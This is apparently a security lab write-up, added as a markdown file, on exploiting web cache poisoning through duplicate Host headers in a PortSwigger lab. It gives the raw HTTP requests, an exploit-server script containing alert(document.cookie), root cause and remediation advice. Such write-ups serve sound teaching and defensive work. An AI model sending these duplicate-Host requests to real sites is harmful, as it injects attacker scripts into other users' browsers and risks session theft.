@@ -1,0 +1,410 @@
+# Web Cache Poisoning via Host Header Parsing Discrepancy
+
+## 1. Executive Summary
+
+The application was vulnerable to **web cache poisoning caused by inconsistent parsing of multiple `Host` headers**.
+
+The application correctly validated the first `Host` header, preventing direct requests containing an unauthorized hostname. However, another component processed the second `Host` header and used its value when generating an absolute URL for the `tracking.js` resource.
+
+Because the resulting response was cached, an attacker could inject an attacker-controlled JavaScript URL into the cached homepage.
+
+When another user requested the poisoned page, their browser loaded the attacker's JavaScript from the exploit server, resulting in arbitrary JavaScript execution in the victim's browser context.
+
+**Vulnerability:** Web Cache Poisoning / Host Header Injection
+**Severity:** High
+**Primary impact:** Arbitrary JavaScript execution in the victim's browser
+**Affected functionality:** Homepage and tracking script URL generation
+
+---
+
+## 2. Vulnerability Description
+
+The application validates the `Host` header to ensure that requests are directed to the legitimate lab domain.
+
+However, the application accepts multiple `Host` headers and processes them inconsistently.
+
+For example:
+
+```http
+GET / HTTP/1.1
+Host: legitimate-lab-domain
+Host: attacker-controlled-domain
+```
+
+The first `Host` value is used for validation and routing, while the second value is reflected into an absolute URL within the response.
+
+The resulting response is subsequently stored in the web cache.
+
+This allows an attacker to poison the cache with a response containing a malicious JavaScript URL.
+
+---
+
+## 3. Reconnaissance
+
+The initial request to the homepage was captured using Burp Suite:
+
+```http
+GET / HTTP/2
+Host: <LAB-DOMAIN>
+```
+
+The application returned the normal homepage.
+
+The response also contained cache-related headers that exposed information about whether the response was retrieved from the cache and, depending on the response, how old the cached object was.
+
+These headers were useful for determining when the cache had been successfully poisoned.
+
+---
+
+## 4. Host Header Validation
+
+The `Host` header was modified to an arbitrary domain:
+
+```http
+GET / HTTP/1.1
+Host: example.com
+```
+
+The application rejected the request.
+
+This demonstrated that the application performed validation of the supplied host.
+
+At this stage, directly replacing the legitimate `Host` value was therefore insufficient.
+
+---
+
+## 5. Testing Multiple Host Headers
+
+A second `Host` header was added:
+
+```http
+GET /?cb=123 HTTP/1.1
+Host: <LAB-DOMAIN>
+Host: example.com
+```
+
+The application continued to accept the request.
+
+However, the response contained an absolute URL using the second host, for example:
+
+```html
+<script src="https://example.com/resources/js/tracking.js">
+```
+
+This demonstrated an important parsing discrepancy.
+
+The application effectively processed the request in two different ways:
+
+```text
+First Host
+    ↓
+Validation / routing
+    ↓
+Legitimate host accepted
+
+Second Host
+    ↓
+URL generation
+    ↓
+Attacker-controlled value reflected
+```
+
+---
+
+## 6. Cache Poisoning Confirmation
+
+The second `Host` header was removed while keeping the same cache-busting parameter:
+
+```http
+GET /?cb=123 HTTP/1.1
+Host: <LAB-DOMAIN>
+```
+
+The response still contained the previously injected URL.
+
+This demonstrated that the manipulated response had been stored in the cache.
+
+The attack chain was therefore:
+
+```text
+Attacker-controlled Host
+        ↓
+Manipulated response
+        ↓
+Response cached
+        ↓
+Victim requests cached page
+        ↓
+Victim receives attacker-controlled script URL
+```
+
+The cache-busting parameter was useful during testing because it allowed fresh cache entries to be generated without immediately interfering with previously cached responses.
+
+---
+
+## 7. Exploit Server Setup
+
+An attacker-controlled JavaScript resource was created on the PortSwigger exploit server:
+
+```text
+/resources/js/tracking.js
+```
+
+The file contained:
+
+```javascript
+alert(document.cookie)
+```
+
+The exploit server therefore provided the malicious JavaScript that would be loaded by the poisoned page.
+
+---
+
+## 8. Cache Poisoning
+
+The malicious host was then supplied as the second `Host` header:
+
+```http
+GET /?cb=123 HTTP/1.1
+Host: <LAB-DOMAIN>
+Host: <EXPLOIT-SERVER-DOMAIN>
+```
+
+The resulting response contained:
+
+```html
+<script src="https://<EXPLOIT-SERVER-DOMAIN>/resources/js/tracking.js">
+```
+
+After the response was cached, subsequent requests using the same cache key received the poisoned response.
+
+---
+
+## 9. Victim Simulation
+
+The poisoned page was then requested through the browser.
+
+The browser processed the injected script:
+
+```html
+<script src="https://<EXPLOIT-SERVER-DOMAIN>/resources/js/tracking.js">
+```
+
+The exploit server returned:
+
+```javascript
+alert(document.cookie)
+```
+
+The alert appearing in the browser confirmed that the attacker's JavaScript was successfully executed in the context of the vulnerable application.
+
+This was the key proof that the cache poisoning attack had succeeded.
+
+---
+
+## 10. Root Cause
+
+The root cause was the inconsistent handling of multiple `Host` headers by different components of the application or its infrastructure.
+
+One component used the first `Host` value for security validation, while another component used the second value for generating URLs.
+
+This created a discrepancy:
+
+```text
+Security validation:
+Host #1 → trusted
+
+URL generation:
+Host #2 → trusted
+```
+
+The application therefore allowed an attacker-controlled value to influence the generated response despite successfully passing the host validation.
+
+The caching layer then amplified the vulnerability by storing and serving the manipulated response to subsequent users.
+
+---
+
+## 11. Security Impact
+
+Successful exploitation can allow an attacker to inject arbitrary external resources into cached responses.
+
+Depending on the application's behavior and browser security controls, this can lead to:
+
+* Arbitrary JavaScript execution.
+* Theft of sensitive client-side information.
+* Session compromise where cookies are accessible to JavaScript.
+* Phishing or malicious content injection.
+* Manipulation of application behavior.
+* Persistent exploitation against users receiving the poisoned cached response.
+
+In this laboratory, JavaScript execution was demonstrated using:
+
+```javascript
+alert(document.cookie)
+```
+
+This is a proof of concept demonstrating that attacker-controlled JavaScript was loaded by the victim's browser.
+
+---
+
+## 12. Remediation
+
+### 12.1 Reject Multiple Host Headers
+
+The application should reject requests containing multiple `Host` headers rather than allowing different components to interpret them differently.
+
+For example:
+
+```text
+Multiple Host headers detected
+        ↓
+Reject request
+        ↓
+HTTP 400 Bad Request
+```
+
+### 12.2 Normalize Host Header Processing
+
+All components involved in processing the request should use the same parsing and validation rules.
+
+The value used for:
+
+* routing,
+* validation,
+* URL generation,
+* caching,
+
+must be consistent.
+
+### 12.3 Validate the Host Against an Allowlist
+
+The application should only accept explicitly authorized hostnames.
+
+For example:
+
+```text
+Allowed:
+www.example.com
+
+Rejected:
+attacker.example
+localhost
+example.com.attacker.example
+```
+
+### 12.4 Avoid Building URLs from Untrusted Host Headers
+
+Absolute URLs should preferably be generated from a trusted, server-side configuration value rather than directly from the client-supplied `Host` header.
+
+For example:
+
+```text
+PUBLIC_BASE_URL=https://www.example.com
+```
+
+rather than:
+
+```text
+https://<request Host>/resources/js/tracking.js
+```
+
+### 12.5 Review Cache Key Construction
+
+The cache should normalize requests consistently and ensure that every input capable of influencing the response is appropriately represented in the cache key.
+
+Security-sensitive headers should not be ignored by the cache if they influence the generated response.
+
+---
+
+## 13. Proof of Concept
+
+The vulnerable request was:
+
+```http
+GET / HTTP/1.1
+Host: <LAB-DOMAIN>
+Host: <EXPLOIT-SERVER-DOMAIN>
+```
+
+The resulting response contained:
+
+```html
+<script src="https://<EXPLOIT-SERVER-DOMAIN>/resources/js/tracking.js">
+```
+
+The malicious JavaScript was:
+
+```javascript
+alert(document.cookie)
+```
+
+After the response was cached, requesting the poisoned page caused the JavaScript to execute in the browser.
+
+---
+
+## 14. Attack Flow
+
+```text
+                    Attacker
+                       │
+                       ▼
+        Multiple Host headers supplied
+                       │
+             ┌─────────┴─────────┐
+             │                   │
+          Host #1             Host #2
+             │                   │
+             ▼                   ▼
+       Validation            URL generation
+             │                   │
+       Legitimate ✓        Attacker domain
+             │                   │
+             └─────────┬─────────┘
+                       ▼
+                Poisoned response
+                       │
+                       ▼
+                     Cache
+                       │
+                       ▼
+                    Victim
+                       │
+                       ▼
+            Loads tracking.js
+                       │
+                       ▼
+             Attacker JavaScript
+                       │
+                       ▼
+             JavaScript execution
+```
+
+---
+
+## 15. Risk Classification
+
+| Category                | Classification                                              |
+| ----------------------- | ----------------------------------------------------------- |
+| Vulnerability           | Web Cache Poisoning                                         |
+| Related Vulnerability   | Host Header Injection                                       |
+| Root Cause              | Inconsistent parsing of multiple Host headers               |
+| CWE                     | CWE-444 – Inconsistent Interpretation of HTTP Requests      |
+| OWASP Category          | A05: Security Misconfiguration / A01: Broken Access Control |
+| Severity                | High                                                        |
+| Authentication Required | No                                                          |
+| User Interaction        | Victim must request the poisoned resource                   |
+| Primary Impact          | Arbitrary JavaScript execution                              |
+
+---
+
+## 16. Conclusion
+
+The vulnerability resulted from a discrepancy in how multiple `Host` headers were interpreted.
+
+The first `Host` header was used to satisfy the application's validation logic, while the second `Host` header influenced the generation of an absolute JavaScript URL.
+
+Because the manipulated response was cached, the attacker could persist the malicious response and cause subsequent users to load attacker-controlled JavaScript.
+
+The successful execution of `alert(document.cookie)` demonstrated that the attacker could control JavaScript loaded by the vulnerable application.
+
+The vulnerability can be prevented by rejecting duplicate `Host` headers, applying consistent request parsing across all components, validating hosts against a strict allowlist, avoiding construction of security-sensitive URLs from untrusted headers, and ensuring that cache keys correctly account for all inputs that influence a response.
